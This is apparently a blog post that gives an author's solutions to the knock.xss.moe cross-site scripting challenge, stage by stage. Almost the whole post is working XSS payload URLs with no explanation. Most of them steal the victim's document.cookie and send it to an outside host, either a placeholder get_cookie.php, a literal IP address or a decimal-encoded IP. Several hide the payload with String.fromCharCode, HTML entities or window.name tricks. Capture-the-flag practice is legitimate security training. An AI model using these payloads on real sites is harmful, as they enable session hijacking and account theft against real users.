---
layout : post
title : knock.xss.moe
---

All solution
Ranking #41

stage3:
```
http://68e3b596ebf790e8a781b8d87b84af7eb7b0aeb3.knock.xss.moe/?q=%22%3E%3Cscript%20language%3D%22JavaScript%22%3Edocument.location%3D%27http%3A%2f%2fxxx%2fget_cookie.php%3Fcookie%3D%27%2bdocument.cookie%3B%3C%2fscript%3E
```
stage5:
```
</textarea><script>alert('xxx')</script>
```
stage6:
```
</xmp><script>alert('xxx')</script>
```

stage7:
```
http://8005f6694d2862438bad3715436522e27dbd81a4.knock.xss.moe/?q=%22%20onfocus%3D%22%20location.href%3D%27http%3A%2f%2fxxx%2fget_cookie.php%3Fcookie%27%2bdocument.cookie%22%20autofocus%3D%22
```
stage8

stage9:
```
http://e461f5f6c542ae79ccc144093c63d0b074e591cd.knock.xss.moe/?q=%00%00%20autofocus%20onfocus%3Dlocation.href%3D%27http%3A%2f%2fxxx%2fget_cookie.php%3Fcookie%27%2bdocument.cookie
```

stage10:
```
http://811fbf0db9c40565743a37c2978f812b82eb89a6.knock.xss.moe/?q=javascript:document.location.href='http://xxx/get_cookie.php?cookie'+document.cookie
```
stage11:
```
<iframe src="XSS"></iframe>
http://38e585f94f9d1f6bb79e88b74f3a5b5871d5bb84.knock.xss.moe/?q=javascript%3Adocument.location.href%3D%22http%3A%2f%2fxxx%2fget_cookie.php%3Fcookie%22%2bdocument.cookie%3B
```
stage12:
```
javascript:window.open(`http://xxxx/?x=`+document.cookie)
```

stage13:
```
<script language=javascript>eval(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 108, 111, 99, 97, 116, 105, 111, 110, 46, 104, 114, 101, 102, 61, 39, 104, 116, 116, 112, 58, 47, 47, 103, 111, 111, 103, 108, 101, 46, 99, 111, 109, 39 ))</script>
```

stage 14:
```
http://8293927d3c84ed42eef26dd9ceaaa3d9bf448dda.knock.xss.moe/?document.domain=%22knock.xss.moe%22;eval(String.fromCharCode(119,%20105,%20110,%20100,%20111,%20119,%2046,%20111,%20112,%20101,%20110,%2040,%2034,%20104,%20116,%20116,%20112,%2058,%2047,%2047,%2049,%2049,%2056,%2046,%2054,%2057,%2046,%2049,%2051,%2053,%2046,%2049,%2054,%2051,%2047,%20103,%20101,%20116,%2095,%2099,%20111,%20111,%20107,%20105,%20101,%2046,%20112,%20104,%20112,%2063,%2099,%20111,%20111,%20107,%20105,%20101,%2061,%2034,%2043,%20112,%2097,%20114,%20101,%20110,%20116,%2046,%20100,%20111,%2099,%20117,%20109,%20101,%20110,%20116,%2046,%2099,%20111,%20111,%20107,%20105,%20101,%2041))
```

stage 15:
```
http://e3bcee011cad77ba066ca7c2ad2884372aec9566.knock.xss.moe/?q=%3Cimg%20src%3D1%20onerror%3Dwindow.location.href%3D%27http%3A%2f%2fxxx%2fget_cookie.php%3Fcookie%27%2bdocument.cookie%3B%3E
```

stage 17:
```
http://34a131df991487bf58d3df0a85e247d396fb93a0.knock.xss.moe/?q=javascript%3Alocation.href%3D%22http%3A%2f%2fxxx%2fget_cookie.php%3Fcookie%3D%22%2bdocument.cookie
```

stage 19:
```
<body onload="alert('XXX, &#039; ,0,window.open(&#039;http://xxx/get_cookie.php?cookie&#039; document.cookie));"//')">
http://224d0c5677307d743ba90c8f81e42f5be648cd97.knock.xss.moe/?q=1%27%2C0%2Cwindow.open%28%27http%3A%2f%2fxxx%2fget_cookie.php%3Fcookie%27%2bdocument.cookie%29%29%3B%2f%2f
```

stage 21:
```
X-XSS-Protection:1; mode=block
http://49ab9ff165cd76ffe06af0b72f450c82f35db396.knock.xss.moe/?q=%3CscripT%3Edocument.locascripttion.href%3D%27http%3A%2f%2f118.69.135.163%2fget_cookie.php%3Fcookie%27%2bdocument.cookie%3C%2fsCripT%3E
```

stage 22:
```
http://bcd699e871d46c191f3c43a7197c18440b308507.knock.xss.moe/?q=%3Csvg%2fonload%3Dwindow.open%28%22%2f%2f1984268195%2f%3Fx%3D%22%2bdocument.cookie%29%3E
```

Local file:
``` html
<script>
window.name = "location.href='http://xxxx/?'+document.cookie";
location.href = "http://target.knock.xss.moe/?q=%3Csvg/onload=eval(name)%3E";
</script>
```

stage 23 & 24:
```
http://51b123fbd6a21b3cf43f49e0a1014221e191c7db.knock.xss.moe/?q=<svg/onload=window.open("//118.69.135.163")>
```

stage 25:
```
http://8e67e39d7e01213d5551c696ef8641b625cc8dd7.knock.xss.moe/?q=%3Ciframe%20src%3D%27%2f%2f118.69.135.163%27%3E
```

stage 26:
```
http://89078a2f1f0b7d9f210b1876f4b20ada0a090ebb.knock.xss.moe/?q=%3CIMG%20SRC%3D1%20onerror%3D%26%23119%3B%26%23105%3B%26%23110%3B%26%23100%3B%26%23111%3B%26%23119%3B%26%2346%3B%26%23111%3B%26%23112%3B%26%23101%3B%26%23110%3B%26%2340%3B%26%2334%3B%26%2347%3B%26%2347%3B%26%2349%3B%26%2349%3B%26%2356%3B%26%2346%3B%26%2354%3B%26%2357%3B%26%2346%3B%26%2349%3B%26%2351%3B%26%2353%3B%26%2346%3B%26%2349%3B%26%2354%3B%26%2351%3B%26%2347%3B%26%23103%3B%26%23101%3B%26%23116%3B%26%2395%3B%26%2399%3B%26%23111%3B%26%23111%3B%26%23107%3B%26%23105%3B%26%23101%3B%26%2346%3B%26%23112%3B%26%23104%3B%26%23112%3B%26%2363%3B%26%2399%3B%26%23111%3B%26%23111%3B%26%23107%3B%26%23105%3B%26%23101%3B%26%2334%3B%26%2343%3B%26%23100%3B%26%23111%3B%26%2399%3B%26%23117%3B%26%23109%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%2399%3B%26%23111%3B%26%23111%3B%26%23107%3B%26%23105%3B%26%23101%3B%26%2341%3B%3E
```


stage 27:
```
http://295a1d900c5bf618101abf69083622d0f69aded1.knock.xss.moe/?q=%3Cimg%20src%3Dx%20onerror%3Dwindow%5B%27location%27%5D%3D%22http%3A%2f%2f%2f1984268195%2f%3F%22%2bdocument%5B%27cookie%27%5D%3
```

stage 28:
```
http://02f6f47ddaa7b22137a74843f2c4f1ac915dda3b.knock.xss.moe/?q=%3Cimg%20src%3Dx%20onerror%3Dwindow%5B%60location%60%5D%3D%60http%3A%2f%2f%2f1984268195%2f%3F%60%2bdocument%5B%60cookie%60%5D%3E
```

stage 29:
```
http://a4bf8393a4159b94aa4b84e9a134d5e6140f3c34.knock.xss.moe/?q=window%5B%60location%60%5D%3D%60http%3A%2f%2f%2f1984268195%2f%3F%60%2bdocument%5B%60cookie%60%5D
```

stage 30:
```
http://ebf510ac2d79576cd5b7d45412eaf3eed1781bd0.knock.xss.moe/?q=window%5B%60location%60%5D%3D%60http%3A%2f%2f%2f1984268195%2f%3F%60%2bdocument%5B%60cookie%60%5D
```

stage 31:
```
http://bb84607f02113a22396438c9a67e4c5abdfd6561.knock.xss.moe/?q=%3Csvg%2fonload%3Dwindow.open%28%22%2f%2f118.69.135.163%2fget_cookie.php%3F%22%2bdocument.cookie%29
```

stage 32:
```
http://859c559a54a1e9b761f8dae102af5edb2ab44215.knock.xss.moe/?q=%3Csvg%2fonload%3Dwindow.open%28%22%2f%2f118.69.135.163%2fget_cookie.php%3F%22%2bdocument.cookie%29
```

stage 33:
```
http://b236561a32729676d1ec2231e8726a0b5ee5bf57.knock.xss.moe/?q=%3Csvg%2fonload%3Dwindow.open%28%22%2f%2f118.69.135.163%2fget_cookie.php%3F%22%2bdocument.cookie%29
```
stage 34:
```
http://[stage34]/?q=%3Csvg%2fonload%3Dwindow.open%28%22%2f%2f118.69.135.163%2fget_cookie.php%3F%22%2bdocument.cookie%29
```

Thanks @ml and @tsu for sharing!
